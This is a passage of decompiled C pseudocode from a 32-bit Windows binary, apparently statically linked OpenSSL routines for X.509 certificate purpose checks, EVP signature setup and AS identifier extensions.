      a1[3] = **(unsigned __int8 **)(v2 + 8);
    if ( *(int *)v2 > 1 )
      a1[3] |= *(unsigned __int8 *)(*(_DWORD *)(v2 + 8) + 1) << 8;
    a1[3] &= 0x807Fu;
  }
  else
  {
    a1[3] = 32895;
  }
  result = (_DWORD *)*a1;
  if ( *a1 && *result == 1 )
  {
    v4 = 0;
    if ( sub_426A30(a1[2]) <= 0 )
      goto LABEL_15;
    while ( 1 )
    {
      v5 = (_DWORD *)sub_426A40((int *)a1[2], v4);
      if ( *v5 == 4 )
        break;
      if ( ++v4 >= sub_426A30(a1[2]) )
        goto LABEL_15;
    }
    v6 = (void *)v5[1];
    if ( !v6 )
LABEL_15:
      v6 = (void *)sub_432E70(a2);
    return (_DWORD *)sub_432010(*a1, v6);
  }
  return result;
}

//----- (0044F3E0) --------------------------------------------------------
int __usercall sub_44F3E0@<eax>(int a1@<edi>)
{
  int v1; // eax
  int v2; // ebx
  int result; // eax
  int *v4; // eax

  v1 = sub_431A60(a1, 103, 0, 0);
  *(_DWORD *)(a1 + 140) = v1;
  v2 = 0;
  result = sub_426A30(v1);
  if ( result > 0 )
  {
    do
    {
      v4 = (int *)sub_426A40(*(int **)(a1 + 140), v2);
      sub_44F340(v4, a1);
      ++v2;
      result = sub_426A30(*(_DWORD *)(a1 + 140));
    }
    while ( v2 < result );
  }
  return result;
}

//----- (0044F430) --------------------------------------------------------
int __fastcall sub_44F430(int a1, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(a2 + 112);
  if ( (v2 & 2) != 0 && (*(_BYTE *)(a2 + 116) & 4) == 0 )
    return 0;
  if ( (v2 & 1) != 0 )
    return ((unsigned __int8)v2 >> 4) & 1;
  if ( (v2 & 0x2040) == 8256 )
    return 3;
  if ( (*(_DWORD *)(a2 + 112) & 2) != 0 )
    return 4;
  if ( (v2 & 8) != 0 && (*(_BYTE *)(a2 + 124) & 7) != 0 )
    return 5;
  else
    return 0;
}

//----- (0044F490) --------------------------------------------------------
int __cdecl sub_44F490(int a1, int a2, int a3)
{
  int v3; // ecx
  int v4; // eax
  int result; // eax
  int v6; // edx

  v4 = *(_DWORD *)(a2 + 112);
  if ( (v4 & 4) != 0 && (*(_BYTE *)(a2 + 120) & 2) == 0 )
    return 0;
  if ( a3 )
  {
    result = sub_44F430(v3, a2);
    if ( !result || result == 5 && (*(_BYTE *)(v6 + 124) & 4) == 0 )
      return 0;
  }
  else
  {
    return ((v4 & 2) == 0 || (*(_BYTE *)(a2 + 116) & 0x88) != 0) && ((v4 & 8) == 0 || *(char *)(a2 + 124) < 0);
  }
  return result;
}
// 44F4A8: variable 'v3' is possibly undefined
// 44F4B6: variable 'v6' is possibly undefined

//----- (0044F4E0) --------------------------------------------------------
int __cdecl sub_44F4E0(int a1, int a2, int a3)
{
  int v3; // ecx
  int v4; // eax
  int result; // eax
  int v6; // edx

  v4 = *(_DWORD *)(a2 + 112);
  if ( (v4 & 4) != 0 && (*(_BYTE *)(a2 + 120) & 0x11) == 0 )
    return 0;
  if ( a3 )
  {
    result = sub_44F430(v3, a2);
    if ( !result || result == 5 && (*(_BYTE *)(v6 + 124) & 4) == 0 )
      return 0;
  }
  else
  {
    return ((v4 & 8) == 0 || (*(_BYTE *)(a2 + 124) & 0x40) != 0)
        && ((v4 & 2) == 0 || (*(_BYTE *)(a2 + 116) & 0xA8) != 0);
  }
  return result;
}
// 44F4F8: variable 'v3' is possibly undefined
// 44F506: variable 'v6' is possibly undefined

//----- (0044F530) --------------------------------------------------------
int __cdecl sub_44F530(int a1, int a2, int a3)
{
  int v3; // ecx
  int v4; // eax
  int result; // eax
  int v6; // edx
  int v7; // eax

  v4 = *(_DWORD *)(a2 + 112);
  if ( (v4 & 4) != 0 && (*(_BYTE *)(a2 + 120) & 0x11) == 0 )
    return 0;
  if ( a3 )
  {
    result = sub_44F430(v3, a2);
    if ( !result || result == 5 && (*(_BYTE *)(v6 + 124) & 4) == 0 )
      return 0;
  }
  else
  {
    if ( (v4 & 8) != 0 && (*(_BYTE *)(a2 + 124) & 0x40) == 0 )
      return 0;
    v7 = *(_DWORD *)(a2 + 112) & 2;
    if ( v7 )
    {
      if ( (*(_BYTE *)(a2 + 116) & 0xA8) == 0 )
        return 0;
    }
    return !v7 || (*(_BYTE *)(a2 + 116) & 0x20) != 0;
  }
  return result;
}
// 44F548: variable 'v3' is possibly undefined
// 44F556: variable 'v6' is possibly undefined

//----- (0044F590) --------------------------------------------------------
int __cdecl sub_44F590(int a1, int a2, int a3)
{
  int v3; // ecx
  int result; // eax
  int v5; // edx
  bool v6; // zf
  int v7; // eax

  v3 = *(_DWORD *)(a2 + 112);
  if ( (v3 & 4) != 0 && (*(_BYTE *)(a2 + 120) & 4) == 0 )
    return 0;
  if ( !a3 )
  {
    if ( (v3 & 8) == 0 || (v7 = *(_DWORD *)(a2 + 124), (v7 & 0x20) != 0) )
    {
      result = 1;
    }
    else
    {
      if ( (v7 & 0x80u) == 0 )
        return 0;
      result = 2;
    }
    if ( (v3 & 2) == 0 )
      return result;
    v6 = (*(_BYTE *)(a2 + 116) & 0xC0) == 0;
LABEL_14:
    if ( !v6 )
      return result;
    return 0;
  }
  result = sub_44F430(v3, a2);
  if ( result )
  {
    if ( result != 5 )
      return result;
    v6 = (*(_BYTE *)(v5 + 124) & 2) == 0;
    goto LABEL_14;
  }
  return 0;
}
// 44F5B7: variable 'v5' is possibly undefined

//----- (0044F5F0) --------------------------------------------------------
int __cdecl sub_44F5F0(int a1, int a2, int a3)
{
  int v3; // ecx
  int result; // eax
  int v5; // edx
  bool v6; // zf
  int v7; // eax

  v3 = *(_DWORD *)(a2 + 112);
  if ( (v3 & 4) != 0 && (*(_BYTE *)(a2 + 120) & 4) == 0 )
    return 0;
  if ( !a3 )
  {
    if ( (v3 & 8) == 0 || (v7 = *(_DWORD *)(a2 + 124), (v7 & 0x20) != 0) )
    {
      result = 1;
    }
    else
    {
      if ( (v7 & 0x80u) == 0 )
        return 0;
      result = 2;
    }
    if ( (v3 & 2) == 0 )
      return result;
    v6 = (*(_BYTE *)(a2 + 116) & 0x20) == 0;
LABEL_14:
    if ( !v6 )
      return result;
    return 0;
  }
  result = sub_44F430(v3, a2);
  if ( result )
  {
    if ( result != 5 )
      return result;
    v6 = (*(_BYTE *)(v5 + 124) & 2) == 0;
    goto LABEL_14;
  }
  return 0;
}
// 44F617: variable 'v5' is possibly undefined

//----- (0044F650) --------------------------------------------------------
int __cdecl sub_44F650(int a1, int a2, int a3)
{
  int v3; // ecx
  int v4; // eax

  if ( !a3 )
    return (*(_BYTE *)(a2 + 112) & 2) == 0 || (*(_BYTE *)(a2 + 116) & 2) != 0;
  v4 = sub_44F430(v3, a2);
  return v4 != 2 ? v4 : 0;
}
// 44F65B: variable 'v3' is possibly undefined

//----- (0044F690) --------------------------------------------------------
int __cdecl sub_44F690(int a1, int a2, int a3)
{
  int v3; // ecx

  if ( a3 )
    return sub_44F430(v3, a2);
  else
    return 1;
}
// 44F69B: variable 'v3' is possibly undefined

//----- (0044F6B0) --------------------------------------------------------
int __cdecl sub_44F6B0(int a1, _DWORD *a2, int a3)
{
  int v3; // ecx
  int result; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // eax
  int v8; // eax

  if ( a3 )
    return sub_44F430(v3, (int)a2);
  v5 = a2[28];
  result = 0;
  if ( (v5 & 2) == 0 || (v6 = a2[29], (v6 & 0xFFFFFF3F) == 0) && (v6 & 0xC0) != 0 )
  {
    if ( (v5 & 4) != 0 && a2[30] == 64 )
    {
      v7 = sub_431A40((int)a2, 0x7Eu, -1);
      if ( v7 < 0 )
        return 1;
      v8 = sub_431A50((int)a2, v7);
      if ( sub_4319E0(v8) )
        return 1;
    }
  }
  return result;
}
// 44F6BB: variable 'v3' is possibly undefined

//----- (0044F720) --------------------------------------------------------
int sub_44F720()
{
  return 1;
}

//----- (0044F730) --------------------------------------------------------
int __cdecl sub_44F730(int a1, int a2)
{
  unsigned int *v3; // eax
  int *v4; // edi
  int v5; // esi
  _DWORD *v6; // eax
  _DWORD *v7; // esi
  _DWORD *v8; // eax
  _DWORD *v9; // [esp-8h] [ebp-Ch]

  if ( !a2 )
    return 0;
  if ( *(_DWORD *)a2 && *(_DWORD *)(a1 + 128) && sub_437A00(*(unsigned int **)a2, *(_DWORD **)(a1 + 128)) )
    return 30;
  if ( *(_DWORD *)(a2 + 8) )
  {
    v9 = *(_DWORD **)(a2 + 8);
    v3 = (unsigned int *)sub_432E90(a1);
    if ( sub_430F50(v3, v9) )
      return 31;
  }
  v4 = *(int **)(a2 + 4);
  if ( !v4 )
    return 0;
  v5 = 0;
  if ( sub_426A30(*(_DWORD *)(a2 + 4)) <= 0 )
    return 0;
  while ( 1 )
  {
    v6 = (_DWORD *)sub_426A40(v4, v5);
    if ( *v6 == 4 )
      break;
    if ( ++v5 >= sub_426A30((int)v4) )
      return 0;
  }
  v7 = (_DWORD *)v6[1];
  if ( v7 && (v8 = (_DWORD *)sub_432E70(a1), sub_432EA0(v7, v8)) )
    return 31;
  else
    return 0;
}

//----- (0044F7F0) --------------------------------------------------------
void __thiscall sub_44F7F0(int this)
{
  int *v2; // eax
  _DWORD *v3; // eax
  int v4; // esi
  int v5; // eax
  unsigned int **v6; // esi
  int *v7; // eax
  int v8; // ecx
  int v9; // eax
  int *v10; // esi
  int v11; // eax
  int v12; // ecx
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int *v16; // eax
  _DWORD *v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // ecx
  int v23; // esi
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v27; // [esp-14h] [ebp-20h]
  _DWORD *v28; // [esp-10h] [ebp-1Ch]
  BOOL v29; // [esp+4h] [ebp-8h] BYREF
  int v30; // [esp+8h] [ebp-4h] BYREF

  if ( (*(_DWORD *)(this + 112) & 0x100) == 0 )
  {
    v27 = this + 160;
    v2 = (int *)sub_42BEA0();
    sub_433370(this, v2, v27, 0);
    if ( !sub_44CEA0((unsigned int **)this) )
      *(_DWORD *)(this + 112) |= 0x40u;
    v3 = (_DWORD *)sub_431A60(this, 87, 0, 0);
    v4 = (int)v3;
    if ( v3 )
    {
      if ( *v3 )
        *(_DWORD *)(this + 112) |= 0x10u;
      v5 = v3[1];
      if ( v5 )
      {
        if ( *(_DWORD *)(v5 + 4) == 258 || !*(_DWORD *)v4 )
        {
          *(_DWORD *)(this + 112) |= 0x80u;
          *(_DWORD *)(this + 104) = 0;
        }
        else
        {
          *(_DWORD *)(this + 104) = sub_431860(*(unsigned int **)(v4 + 4));
        }
      }
      else
      {
        *(_DWORD *)(this + 104) = -1;
      }
      sub_47DDF0(v4);
      *(_DWORD *)(this + 112) |= 1u;
    }
    v6 = (unsigned int **)sub_431A60(this, 663, 0, 0);
    if ( v6 )
    {
      if ( (*(_BYTE *)(this + 112) & 0x10) != 0 || sub_431A40(this, 0x55u, -1) >= 0 || sub_431A40(this, 0x56u, -1) >= 0 )
        *(_DWORD *)(this + 112) |= 0x80u;
      if ( *v6 )
        *(_DWORD *)(this + 108) = sub_431860(*v6);
      else
        *(_DWORD *)(this + 108) = -1;
      sub_47F950((int)v6);
      *(_DWORD *)(this + 112) |= 0x400u;
    }
    v7 = (int *)sub_431A60(this, 83, 0, 0);
    if ( v7 )
    {
      if ( *v7 <= 0 )
      {
        *(_DWORD *)(this + 116) = 0;
      }
      else
      {
        v8 = *(unsigned __int8 *)v7[2];
        *(_DWORD *)(this + 116) = v8;
        if ( *v7 > 1 )
          *(_DWORD *)(this + 116) = v8 | (*(unsigned __int8 *)(v7[2] + 1) << 8);
      }
      *(_DWORD *)(this + 112) |= 2u;
      sub_42C4F0(v7);
    }
    *(_DWORD *)(this + 120) = 0;
    v9 = sub_431A60(this, 126, 0, 0);
    v10 = (int *)v9;
    if ( v9 )
    {
      *(_DWORD *)(this + 112) |= 4u;
      v29 = 0;
      v11 = sub_426A30(v9);
      v12 = 0;
      if ( v11 > 0 )
      {
        do
        {
          v13 = sub_426A40(v10, v12);
          v14 = sub_423680(v13);
          if ( v14 > 180 )
          {
            if ( v14 == 297 )
            {
              *(_DWORD *)(this + 120) |= 0x80u;
            }
            else if ( v14 == 910 )
            {
              *(_DWORD *)(this + 120) |= 0x100u;
            }
          }
          else if ( v14 == 180 )
          {
            *(_DWORD *)(this + 120) |= 0x20u;
          }
          else
          {
            switch ( v14 )
            {
              case 129:
                *(_DWORD *)(this + 120) |= 1u;
                break;
              case 130:
                *(_DWORD *)(this + 120) |= 2u;
                break;
              case 131:
                *(_DWORD *)(this + 120) |= 8u;
                break;
              case 132:
                *(_DWORD *)(this + 120) |= 4u;
                break;
              case 133:
                *(_DWORD *)(this + 120) |= 0x40u;
                break;
              case 137:
              case 139:
                *(_DWORD *)(this + 120) |= 0x10u;
                break;
              default:
                break;
            }
          }
          ++v29;
          v15 = sub_426A30((int)v10);
          v12 = v29;
        }
        while ( v29 < v15 );
      }
      sub_426C00(v10, (void (__cdecl *)(_DWORD))sub_422B70);
    }
    v16 = (int *)sub_431A60(this, 71, 0, 0);
    if ( v16 )
    {
      if ( *v16 <= 0 )
        *(_DWORD *)(this + 124) = 0;
      else
        *(_DWORD *)(this + 124) = *(unsigned __int8 *)v16[2];
      *(_DWORD *)(this + 112) |= 8u;
      sub_42C4F0(v16);
    }
    *(_DWORD *)(this + 128) = sub_431A60(this, 82, 0, 0);
    *(_DWORD *)(this + 132) = sub_431A60(this, 90, 0, 0);
    v28 = (_DWORD *)sub_432E70(this);
    v17 = (_DWORD *)sub_432E80(this);
    if ( !sub_432EA0(v17, v28) )
    {
      v18 = *(_DWORD *)(this + 132);
      *(_DWORD *)(this + 112) |= 0x20u;
      if ( !sub_44F730(this, v18) )
      {
        v19 = *(_DWORD *)(this + 112);
        if ( (v19 & 2) == 0 || (*(_BYTE *)(this + 116) & 4) != 0 )
          *(_DWORD *)(this + 112) = v19 | 0x2000;
      }
    }
    *(_DWORD *)(this + 144) = sub_431A60(this, 85, 0, 0);
    v20 = sub_431A60(this, 666, &v29, 0);
    *(_DWORD *)(this + 148) = v20;
    if ( !v20 && v29 != -1 )
      *(_DWORD *)(this + 112) |= 0x80u;
    sub_44F3E0(this);
    *(_DWORD *)(this + 152) = sub_431A60(this, 290, 0, 0);
    *(_DWORD *)(this + 156) = sub_431A60(this, 291, 0, 0);
    v29 = 0;
    v21 = sub_431A30(this);
    v22 = v29;
    if ( v29 < v21 )
    {
      while ( 1 )
      {
        v23 = sub_431A50(this, v22);
        v24 = sub_445DB0(v23);
        if ( sub_423680(v24) == 857 )
          *(_DWORD *)(this + 112) |= 0x1000u;
        if ( sub_4319E0(v23) )
        {
          v25 = sub_445DB0(v23);
          v30 = sub_423680(v25);
          if ( !v30 || !sub_423650((int)&v30, (int)"G", 13, 4, (int (__cdecl *)(int, int))sub_42AC20) )
            break;
        }
        ++v29;
        v26 = sub_431A30(this);
        v22 = v29;
        if ( v29 >= v26 )
        {
          *(_DWORD *)(this + 112) |= 0x100u;
          return;
        }
      }
      *(_DWORD *)(this + 112) |= 0x200u;
    }
    *(_DWORD *)(this + 112) |= 0x100u;
  }
}

//----- (0044FC10) --------------------------------------------------------
int __cdecl sub_44FC10(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // eax

  if ( (*(_DWORD *)(a1 + 112) & 0x100) == 0 )
  {
    sub_414690(*(LPCRITICAL_SECTION *)(a1 + 184));
    sub_44F7F0(a1);
    sub_4146B0(*(LPCRITICAL_SECTION *)(a1 + 184));
  }
  if ( a2 == -1 )
    return 1;
  result = sub_44F2F0(a2);
  if ( result != -1 )
  {
    if ( result >= 0 )
    {
      if ( result >= 9 )
      {
        v4 = sub_426A40((int *)dword_539284, result - 9);
        return (*(int (__cdecl **)(int, int, int))(v4 + 12))(v4, a1, a3);
      }
      else
      {
        return (*((int (__cdecl **)(char *, int, int))&unk_5317D8 + 7 * result + 3))(
                 (char *)&unk_5317D8 + 28 * result,
                 a1,
                 a3);
      }
    }
    else
    {
      return MEMORY[0xC](0, a1, a3);
    }
  }
  return result;
}
// C: using guessed type int (__cdecl *)(_DWORD, _DWORD, _DWORD);
// 539284: using guessed type int dword_539284;

//----- (0044FCD0) --------------------------------------------------------
BOOL __usercall sub_44FCD0@<eax>(volatile LONG *a1@<ebx>, int a2@<edi>, int a3@<esi>, _DWORD *a4, int *a5, int a6)
{
  int *v6; // ebp
  int v7; // eax
  char *v8; // eax
  int *v10; // eax
  int v11; // ecx
  int (__cdecl *v12)(int *, int); // ecx
  int (__cdecl *v13)(int *, int); // ecx
  unsigned int v14; // [esp+4h] [ebp-4h] BYREF

  v6 = a5;
  if ( !*(_DWORD *)(a3 + 16) )
    *(_DWORD *)(a3 + 16) = sub_443D20(a2, a1);
  v7 = *(_DWORD *)(a3 + 16);
  if ( !v7 )
    return 0;
  if ( (*(_BYTE *)(*(_DWORD *)v7 + 4) & 4) == 0 && !a5 )
  {
    if ( sub_41CD00(a2, (int)&v14) <= 0 || (v8 = sub_4233A0(v14), (v6 = (int *)sub_430D80((int)v8)) == 0) )
    {
      sub_408310(6, 161, 158, (int)"crypto\\evp\\m_sigver.c", 36);
      return 0;
    }
  }
  v10 = *(int **)(a3 + 16);
  v11 = *v10;
  if ( a6 )
  {
    v12 = *(int (__cdecl **)(int *, int))(v11 + 68);
    if ( v12 )
    {
      if ( v12(v10, a3) <= 0 )
        return 0;
      *(_DWORD *)(*(_DWORD *)(a3 + 16) + 16) = 128;
    }
    else if ( sub_453C00(*(int **)(a3 + 16)) <= 0 )
    {
      return 0;
    }
  }
  else
  {
    v13 = *(int (__cdecl **)(int *, int))(v11 + 60);
    if ( v13 )
    {
      if ( v13(v10, a3) <= 0 )
        return 0;
      *(_DWORD *)(*(_DWORD *)(a3 + 16) + 16) = 64;
    }
    else if ( sub_453AC0(*(int **)(a3 + 16)) <= 0 )
    {
      return 0;
    }
  }
  if ( sub_443A60(*(_DWORD *)(a3 + 16), -1, 248, 1, 0, (int)v6) <= 0 )
    return 0;
  if ( a4 )
    *a4 = *(_DWORD *)(a3 + 16);
  return (*(_BYTE *)(**(_DWORD **)(a3 + 16) + 4) & 4) != 0 || sub_42B860(a3, v6, a1) != 0;
}

//----- (0044FE10) --------------------------------------------------------
BOOL __cdecl sub_44FE10(int a1, _DWORD *a2, int *a3, volatile LONG *a4, int a5)
{
  return sub_44FCD0(a4, a5, a1, a2, a3, 0);
}

//----- (0044FE40) --------------------------------------------------------
BOOL __cdecl sub_44FE40(int a1, _DWORD *a2, int *a3, volatile LONG *a4, int a5)
{
  return sub_44FCD0(a4, a5, a1, a2, a3, 1);
}

//----- (0044FE70) --------------------------------------------------------
int __cdecl sub_44FE70(int a1, int a2, unsigned int *a3)
{
  int *v3; // edi
  int v4; // eax
  int result; // eax
  volatile LONG **v6; // eax
  volatile LONG **v7; // edi
  int v8; // esi
  int (__cdecl *v9)(int *, _DWORD, unsigned int *, int); // eax
  bool v10; // zf
  _DWORD **v11; // eax
  _DWORD **v12; // edi
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // [esp+10h] [ebp-50h]
  int v17; // [esp+14h] [ebp-4Ch] BYREF
  BOOL v18; // [esp+18h] [ebp-48h]
  char v19[64]; // [esp+1Ch] [ebp-44h] BYREF

  v3 = *(int **)(a1 + 16);
  v4 = *v3;
  if ( (*(_BYTE *)(*v3 + 4) & 4) != 0 )
  {
    if ( !a2 )
      return (*(int (__cdecl **)(int *, _DWORD, unsigned int *, int))(v4 + 64))(v3, 0, a3, a1);
    if ( (*(_DWORD *)(a1 + 8) & 0x200) != 0 )
      return (*(int (__cdecl **)(int *, int, unsigned int *, int))(v4 + 64))(v3, a2, a3, a1);
    v6 = sub_443E60(*(volatile LONG ***)(a1 + 16));
    v7 = v6;
    if ( v6 )
    {
      v8 = (*((int (__cdecl **)(volatile LONG **, int, unsigned int *, int))*v6 + 16))(v6, a2, a3, a1);
      sub_443A10(v7);
      return v8;
    }
    return 0;
  }
  v9 = *(int (__cdecl **)(int *, _DWORD, unsigned int *, int))(v4 + 64);
  v18 = v9 != 0;
  if ( a2 )
  {
    v10 = (*(_DWORD *)(a1 + 8) & 0x200) == 0;
    v17 = 0;
    if ( v10 )
    {
      v11 = (_DWORD **)sub_42B820();
      v12 = v11;
      if ( !v11 || !sub_42BAA0((int)v11, a1) )
        return 0;
      if ( v18 )
        v13 = (*(int (__cdecl **)(_DWORD *, int, unsigned int *, _DWORD **))(*v12[4] + 64))(v12[4], a2, a3, v12);
      else
        v13 = sub_42BA20((_BYTE **)v12, (int)v19, &v17);
      v16 = v13;
      sub_42B840(v12);
      result = v16;
    }
    else
    {
      if ( !v9 )
      {
        result = sub_42BA20((_BYTE **)a1, (int)v19, &v17);
LABEL_20:
        if ( !result )
          return result;
        v14 = sub_453B20(*(int **)(a1 + 16), a2, a3, (int)v19, v17);
        return v14 > 0;
      }
      result = (*(int (__cdecl **)(int *, int, unsigned int *, int))(*v3 + 64))(v3, a2, a3, a1);
    }
    if ( v18 )
      return result;
    goto LABEL_20;
  }
  if ( !v9 )
  {
    v15 = sub_407480(*(_DWORD *)a1);
    return v15 >= 0 && sub_453B20(v3, 0, a3, 0, v15) > 0;
  }
  v14 = v9(v3, 0, a3, a1);
  return v14 > 0;
}

//----- (00450060) --------------------------------------------------------
int __cdecl sub_450060(int a1, int a2, int a3)
{
  int v3; // eax
  BOOL v4; // ebx
  bool v5; // zf
  int v6; // ebx
  _DWORD **v7; // eax
  _DWORD **v8; // edi
  int v9; // eax
  int v11; // [esp+10h] [ebp-4Ch] BYREF
  BOOL v12; // [esp+14h] [ebp-48h]
  char v13[64]; // [esp+18h] [ebp-44h] BYREF

  v3 = *(_DWORD *)(a1 + 16);
  v11 = 0;
  v4 = *(_DWORD *)(*(_DWORD *)v3 + 72) != 0;
  v5 = (*(_DWORD *)(a1 + 8) & 0x200) == 0;
  v12 = v4;
  if ( !v5 )
  {
    if ( !v4 )
    {
      v6 = sub_42BA20((_BYTE **)a1, (int)v13, &v11);
      goto LABEL_12;
    }
    v6 = (*(int (__cdecl **)(int, int, int, int))(*(_DWORD *)v3 + 72))(v3, a2, a3, a1);
LABEL_11:
    if ( v12 )
      return v6;
LABEL_12:
    if ( v6 )
      return sub_453C60(*(_DWORD **)(a1 + 16));
    return v6;
  }
  v7 = (_DWORD **)sub_42B820();
  v8 = v7;
  if ( v7 && sub_42BAA0((int)v7, a1) )
  {
    if ( v4 )
      v9 = (*(int (__cdecl **)(_DWORD *, int, int, _DWORD **))(*v8[4] + 72))(v8[4], a2, a3, v8);
    else
      v9 = sub_42BA20((_BYTE **)v8, (int)v13, &v11);
    v6 = v9;
    sub_42B840(v8);
    goto LABEL_11;
  }
  return -1;
}

//----- (004501A0) --------------------------------------------------------
void *sub_4501A0()
{
  return &unk_50E278;
}

//----- (004501B0) --------------------------------------------------------
int __cdecl sub_4501B0(int a1, int *a2, int a3, int a4, _DWORD *a5)
{
  int v5; // eax
  void *Block; // [esp+0h] [ebp-4h] BYREF

  Block = 0;
  v5 = sub_42F620(a3, &Block, a1);
  if ( !Block || !sub_42BC10((int)Block, v5, a4, a5, a2, 0) )
    return 0;
  sub_413490(Block);
  return 1;
}

//----- (00450220) --------------------------------------------------------
void *sub_450220()
{
  return &unk_50E3A8;
}

//----- (00450230) --------------------------------------------------------
void *sub_450230()
{
  return &unk_50E464;
}

//----- (00450240) --------------------------------------------------------
void *sub_450240()
{
  return &unk_50E4A8;
}

//----- (00450250) --------------------------------------------------------
void *sub_450250()
{
  return &unk_50E4EC;
}

//----- (00450260) --------------------------------------------------------
void *sub_450260()
{
  return &unk_50E530;
}

//----- (00450270) --------------------------------------------------------
void __cdecl sub_450270(int a1)
{
  sub_42FEF0(a1, (int)&unk_50E4A8);
}

//----- (00450290) --------------------------------------------------------
void __cdecl sub_450290(int a1)
{
  sub_42FEF0(a1, (int)&unk_50E530);
}

//----- (004502B0) --------------------------------------------------------
int __usercall sub_4502B0@<eax>(int a1@<ebx>, _DWORD *a2, int a3, const char *a4)
{
  _DWORD *v4; // edi
  int v6; // esi
  const char *v7; // eax
  char *v8; // edi
  const char *v9; // eax
  char *v10; // esi
  const char *v11; // eax
  char *v12; // esi
  int v13; // [esp+8h] [ebp-4h]

  v4 = a2;
  if ( !a2 )
    return 1;
  sub_419190(a1, "%*s%s:\n", a3, byte_4F1291, a4);
  if ( !*a2 )
  {
    sub_419190(a1, "%*sinherit\n", a3 + 2, byte_4F1291);
    return 1;
  }
  if ( *a2 != 1 )
    return 0;
  v13 = 0;
  if ( sub_426A30(a2[1]) <= 0 )
    return 1;
  do
  {
    v6 = sub_426A40((int *)v4[1], v13);
    if ( *(_DWORD *)v6 )
    {
      if ( *(_DWORD *)v6 != 1 )
        return 0;
      v7 = sub_44D0E0(0, **(_DWORD **)(v6 + 4));
      v8 = (char *)v7;
      if ( !v7 )
        return 0;
      sub_419190(a1, "%*s%s-", a3 + 2, byte_4F1291, v7);
      sub_413490(v8);
      v9 = sub_44D0E0(0, *(_DWORD *)(*(_DWORD *)(v6 + 4) + 4));
      v10 = (char *)v9;
      if ( !v9 )
        return 0;
      sub_419190(a1, "%s\n", v9);
      sub_413490(v10);
      v4 = a2;
    }
    else
    {
      v11 = sub_44D0E0(0, *(_DWORD *)(v6 + 4));
      v12 = (char *)v11;
      if ( !v11 )
        return 0;
      sub_419190(a1, "%*s%s\n", a3 + 2, byte_4F1291, v11);
      sub_413490(v12);
    }
    ++v13;
  }
  while ( v13 < sub_426A30(v4[1]) );
  return 1;
}

//----- (00450440) --------------------------------------------------------
BOOL __cdecl sub_450440(int a1, _DWORD **a2, int a3, int a4)
{
  return sub_4502B0(a3, *a2, a4, "Autonomous System Numbers") && sub_4502B0(a3, a2[1], a4, "Routing Domain Identifiers");
}

//----- (00450490) --------------------------------------------------------
int __cdecl sub_450490(int **a1, _DWORD **a2)
{
  int *v2; // esi
  int v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  int result; // eax

  v2 = *a1;
  v3 = **a1;
  v4 = *a2;
  if ( (v3 || !v2[1]) && (v3 != 1 || (v5 = (_DWORD *)v2[1]) == 0 || !*v5 || !v5[1]) )
    sub_417C70(
      "assertion failed: (a->type == ASIdOrRange_id && a->u.id != NULL) || (a->type == ASIdOrRange_range && a->u.range !="
      " NULL && a->u.range->min != NULL && a->u.range->max != NULL)",
      "crypto\\x509v3\\v3_asid.c",
      128);
  if ( (*v4 || !v4[1]) && (*v4 != 1 || (v6 = (_DWORD *)v4[1]) == 0 || !*v6 || !v6[1]) )
    sub_417C70(
      "assertion failed: (b->type == ASIdOrRange_id && b->u.id != NULL) || (b->type == ASIdOrRange_range && b->u.range !="
      " NULL && b->u.range->min != NULL && b->u.range->max != NULL)",
      "crypto\\x509v3\\v3_asid.c",
      132);
  v7 = *v2;
  if ( !*v2 && !*v4 )
    return sub_430F50((unsigned int *)v2[1], (_DWORD *)v4[1]);
  if ( v7 == 1 && *v4 == 1 )
  {
    result = sub_430F50(*(unsigned int **)v2[1], *(_DWORD **)v4[1]);
    if ( !result )
      return sub_430F50(*(unsigned int **)(v2[1] + 4), *(_DWORD **)(v4[1] + 4));
  }
  else if ( v7 )
  {
    return sub_430F50(*(unsigned int **)v2[1], (_DWORD *)v4[1]);
  }
  else
  {
    return sub_430F50((unsigned int *)v2[1], *(_DWORD **)v4[1]);
  }
  return result;
}

//----- (004505A0) --------------------------------------------------------
BOOL __cdecl sub_4505A0(int a1, int a2)
{
  int v2; // esi
  int v4; // eax

  v2 = a1;
  if ( !a1 )
    return 0;
  if ( a2 )
  {
    if ( a2 != 1 )
      return 0;
    v2 = a1 + 4;
  }
  if ( !*(_DWORD *)v2 )
  {
    v4 = sub_42FB20((int)&unk_50E4EC);
    *(_DWORD *)v2 = v4;
    if ( !v4 )
      return 0;
    if ( *(_DWORD *)(v4 + 4) )
      sub_417C70("assertion failed: (*choice)->u.inherit == NULL", "crypto\\x509v3\\v3_asid.c", 170);
    *(_DWORD *)(*(_DWORD *)v2 + 4) = sub_42C580();
    if ( !*(_DWORD *)(*(_DWORD *)v2 + 4) )
      return 0;
    **(_DWORD **)v2 = 0;
  }
  return **(_DWORD **)v2 == 0;
}

//----- (00450620) --------------------------------------------------------
int __cdecl sub_450620(int a1, int a2, int a3, int a4)
{
  int v4; // edi
  int result; // eax
  int v6; // eax
  int v7; // esi
  void **v8; // eax

  v4 = a1;
  if ( !a1 )
    return 0;
  if ( a2 )
  {
    if ( a2 != 1 )
      return 0;
    v4 = a1 + 4;
  }
  if ( *(_DWORD *)v4 )
  {
    if ( !**(_DWORD **)v4 )
      return 0;
  }
  else
  {
    v6 = sub_42FB20((int)&unk_50E4EC);
    *(_DWORD *)v4 = v6;
    if ( !v6 )
      return 0;
    if ( *(_DWORD *)(v6 + 4) )
      sub_417C70("assertion failed: (*choice)->u.asIdsOrRanges == NULL", "crypto\\x509v3\\v3_asid.c", 203);
    *(_DWORD *)(*(_DWORD *)v4 + 4) = sub_426860((int)sub_450490);
    if ( !*(_DWORD *)(*(_DWORD *)v4 + 4) )
      return 0;
    **(_DWORD **)v4 = 1;
  }
  result = sub_42FB20((int)&unk_50E4A8);
  v7 = result;
  if ( result )
  {
    if ( a4 )
    {
      *(_DWORD *)result = 1;
      v8 = (void **)sub_42FB20((int)&unk_50E464);
      *(_DWORD *)(v7 + 4) = v8;
      if ( !v8 )
      {
LABEL_19:
        sub_42FEF0(v7, (int)&unk_50E4A8);
        return 0;
      }
      sub_42C4F0(*v8);
      **(_DWORD **)(v7 + 4) = a3;
